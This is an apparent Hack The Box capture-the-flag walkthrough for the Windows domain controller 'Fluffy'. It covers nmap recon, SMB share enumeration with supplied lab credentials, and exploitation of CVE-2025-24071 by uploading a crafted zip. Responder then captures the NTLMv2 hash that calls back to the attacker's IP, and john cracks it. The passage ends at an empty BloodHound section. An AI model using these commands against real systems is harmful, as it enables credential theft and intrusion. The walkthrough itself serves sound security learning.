# HTB: Fluffy

**OS:** Windows
**Difficulty:** Easy

---

# Recon

## nmap
`nmap` shows a bunch of open ports:
```bash
➜  sudo nmap -p 53,88,139,389,445,636,3268,3269,5985,9389,49666,5965,49686,49689,49706,49750 -sCV 10.10.11.69 -oN initialScan

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-10 05:26:01Z)
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-06-10T05:27:32+00:00; +7h00m00s from scanner time.
445/tcp   open     microsoft-ds?
636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-10T05:27:32+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-10T05:27:32+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-10T05:27:32+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5965/tcp  filtered unknown
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open     mc-nmf        .NET Message Framing
49666/tcp open     msrpc         Microsoft Windows RPC
49686/tcp open     msrpc         Microsoft Windows RPC
49689/tcp open     msrpc         Microsoft Windows RPC
49706/tcp open     msrpc         Microsoft Windows RPC
49750/tcp open     msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s
| smb2-time:
|   date: 2025-06-10T05:26:52
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.96 seconds
```
Most of these are related to Windows Domain Controller.
The domain is `fluffy.htb` and the hostname is `DC01`, so I add these to my `/etc/hosts` file:
`10.10.11.69    DC01.fluffy.htb fluffy.htb  DC01`

Other interesting ports are SMB on port `445`, WinRM on port `5985` and WS-Management on `9389`.

## Initial Credentials

I'm given credentials for a low priv user (`j.fleischman / J0elTHEM4n1990!`) at the start of the box. So I decided to try them out on both SMB and WinRM.

```bash
➜  netexec smb dc01.fluffy.htb
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
➜  netexec smb dc01.fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!'
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
➜  netexec winrm dc01.fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!'
WINRM       10.10.11.69     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\j.fleischman:J0elTHEM4n1990!
```

They don't work for WinRM, so now it's time to check on SMB.

## SMB (as j.fleischman)

We start by enumerating the shares using `netexec`:
```bash
➜  netexec smb dc01.fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
SMB         10.10.11.69     445    DC01             [*] Enumerated shares
SMB         10.10.11.69     445    DC01             Share           Permissions     Remark
SMB         10.10.11.69     445    DC01             -----           -----------     ------
SMB         10.10.11.69     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.69     445    DC01             C$                              Default share
SMB         10.10.11.69     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.69     445    DC01             IT              READ,WRITE
SMB         10.10.11.69     445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.69     445    DC01             SYSVOL          READ            Logon server share
```

I see that the user has READ,WRITE permssions on the `IT` share so it's worth it to take a closer look at it:
```bash
➜  smbclient //dc01.fluffy.htb/IT -U 'j.fleischman' --password 'J0elTHEM4n1990!'
Can't load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jun 10 07:01:33 2025
  ..                                  D        0  Tue Jun 10 07:01:33 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 16:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 16:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 16:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 16:03:17 2025
  nc64.exe                            A    43696  Tue Jun 10 05:24:51 2025
  shell.exe                           A    73802  Tue Jun 10 02:53:31 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 15:31:07 2025

                5842943 blocks of size 4096. 2075434 blocks available
smb: \> prompt off
smb: \> mget *
getting file \Everything-1.4.1.1026.x64.zip of size 1827464 as Everything-1.4.1.1026.x64.zip (625.1 KiloBytes/sec) (average 625.1 KiloBytes/sec)
getting file \KeePass-2.58.zip of size 3225346 as KeePass-2.58.zip (2699.0 KiloBytes/sec) (average 1226.8 KiloBytes/sec)
getting file \nc64.exe of size 43696 as nc64.exe (188.0 KiloBytes/sec) (average 1171.3 KiloBytes/sec)
getting file \shell.exe of size 73802 as shell.exe (320.3 KiloBytes/sec) (average 1128.5 KiloBytes/sec)
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (737.7 KiloBytes/sec) (average 1109.8 KiloBytes/sec)
```

I see a couple of binaries, specially ones related with KeepPass, but the most interesting thing seems to be the `.pdf`. It contains information on CVEs that the IT teams needs to fix. What if they weren't fixed yet?

# Exploiting CVE-2025-24071

[CVE-2025-24071](https://github.com/0x6rss/CVE-2025-24071_PoC) has a publicly available PoC:
```bash
➜  CVE-2025-24071_PoC git:(main) python3 poc.py
Enter your file name: something
Enter IP (EX: 192.168.1.162): 10.10.14.230
completed

➜  CVE-2025-24071_PoC git:(main) ✗ smbclient //dc01.fluffy.htb/IT -U 'j.fleischman' --password 'J0elTHEM4n1990!'
Can't load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> put
put <filename>
smb: \> put exploit.zip
```

Now we spin up `responder` and wait for a connection back!
```bash
➜  CVE-2025-24071_PoC git:(main) ✗ sudo responder -I tun0 -wvF
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

<...>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\<REDACTED>
<...>
```

And voilá! We got the NTLM hash of the user! Now we can crack it using `john`:
```bash
➜  CVE-2025-24071_PoC git:(main) ✗ john hash.txt --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<REDACTED>  (<REDACTED>)
7g 0:00:00:03 DONE (2025-06-10 00:38) 1.944g/s 1256Kp/s 8792Kc/s 8792KC/s prrm18652886..prisom
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

# BloodHound
Since we now have some functioning AD credentials, we will be using them for further enumerating the DC using `bloodhound`:
```bash
```
